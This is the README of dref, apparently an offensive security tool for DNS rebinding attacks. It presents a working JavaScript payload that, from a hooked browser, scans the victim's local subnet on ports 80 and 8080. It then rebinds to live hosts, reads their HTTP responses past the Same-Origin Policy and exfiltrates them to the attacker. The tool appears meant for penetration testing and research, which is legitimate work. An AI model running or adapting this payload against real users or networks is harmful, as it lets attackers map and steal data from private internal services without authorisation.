<dl>
  <p align="center">
    <img src="https://raw.githubusercontent.com/serain/dref/master/docs/img/logo.png?token=AH5HJaNTqfEIQnbVSX_QaB2Br4R5we5Bks5bOpK4wA%3D%3D">
  </p>

  <!-- REPLACE SHIELDS -->
  <p align="center">
    <a href="https://travis-ci.org/serain/netmap.js.svg?branch=master" style="text-decoration: none">
      <img src="https://travis-ci.org/serain/netmap.js.svg?branch=master">
    </a>
    <a href="https://codecov.io/gh/serain/netmap.js">
      <img src="https://codecov.io/gh/serain/netmap.js/branch/master/graph/badge.svg">
    </a>
    <a href="https://greenkeeper.io/">
      <img src="https://badges.greenkeeper.io/serain/netmap.js.svg">
    </a>
    <a href="https://gitter.im/dref/Lobby/">
      <img src="http://badges.gitter.im/serain/dref.png">
    </a>
  </p>

  <p align="center">DNS Rebinding Exploitation Framework</p>

  <p align="center">
    <img src="https://raw.githubusercontent.com/serain/dref/master/docs/img/diagram.png?token=AH5HJYLZRcWi_aEJCVh8iU4efEQ4tkryks5bOpMMwA%3D%3D">
  </p>
</dl>

dref does the heavy-lifting for [DNS rebinding](https://en.wikipedia.org/wiki/DNS_rebinding). The following snippet from one of its [default payloads](https://github.com/mwrlabs/dref/wiki/Payloads#web-discover) shows the framework being used to scan a local subnet from a hooked browser; after identifying live web services it proceeds to exfiltrate GET responses, [breezing through the Same-Origin policy](https://github.com/mwrlabs/dref/wiki#limitations):

```javascript
// mainFrame() runs first
async function mainFrame () {
  // We use some tricks to derive the browser's local /24 subnet
  const localSubnet = await network.getLocalSubnet('24')

  // We use some more tricks to scan a couple of ports across the subnet
  netmap.tcpScan(localSubnet, [80, 8080]).then(results => {
    // We launch the rebind attack on live targets
    for (let h of results.hosts) {
      for (let p of h.ports) {
        if (p.open) session.createRebindFrame(h.host, p.port)
      }
    }
  })
}

// rebindFrame() will have target ip:port as origin
function rebindFrame () {
  // After this we'll have bypassed the Same-Origin Policy
  session.triggerRebind().then(() => {
    // We can now read the response across origin...
    network.get(session.baseURL, (code, headers, body) => {
      // ... and exfiltrate it
      session.log({code: code, headers: headers, body: body})
    })
  })
}
```

<dl>
  <img align="right" src="https://raw.githubusercontent.com/serain/dref/master/docs/img/exfiltrated.png?token=AH5HJUF5NJX7nlIHFdmlXn74LOZzzbjmks5bOuukwA%3D%3D">
  <img align="right" src="https://raw.githubusercontent.com/serain/dref/master/docs/img/arrow-bottom-right.png?token=AH5HJT0ROw-5c-TlZ7ZvUy0NaANoajbWks5bOuxuwA%3D%3D">
</dl>

<br /><br /><br /><br /><br /><br /><br /><br /><br />
Head over to the [Wiki](https://github.com/mwrlabs/dref/wiki) to get started.

<dl>
  <p align="center">
    <sub><i>This is a development release - <b>do not use in production</b></i></sub>
  </p>
</dl>
